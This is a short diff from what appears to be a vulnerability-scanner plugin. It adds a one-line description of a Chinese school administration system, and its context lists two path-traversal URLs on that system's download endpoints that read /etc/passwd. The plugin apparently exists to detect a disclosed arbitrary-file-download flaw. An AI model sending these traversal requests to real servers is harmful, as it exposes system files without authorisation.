@@ -11,6 +11,7 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-08-08'  # 漏洞公布时间
     desc = '''
+        乐知行教学系统是北京讯飞乐知行软件有限公司打造的一款教学管理一体化系统。
         北京乐知行教务系统 多处存在任意文件下载漏洞：
         /ckfile.do?path=../../../../../../../../../../etc/passwd
         /ueditor/downAttach.do?url=../../../../../../../../../../etc/passwd'
